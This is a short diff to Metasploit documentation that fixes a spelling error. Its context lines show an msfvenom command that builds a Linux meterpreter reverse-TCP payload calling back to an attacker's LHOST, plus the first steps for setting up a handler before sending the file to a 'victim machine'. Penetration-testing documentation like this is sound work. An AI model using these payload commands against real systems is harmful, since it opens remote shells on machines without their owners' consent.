@@ -61,7 +61,7 @@ To use linux/x86/meterpreter/reverse_tcp as an executable, first you can generat
 ./msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o /tmp/payload.bin
 ```
 
-Before sending the exectauble to the victim machine, you need to set up the handler on your end:
+Before sending the executable to the victim machine, you need to set up the handler on your end:
 
 1. Start msfconsole
 2. Do: ```use exploit/multi/handler```
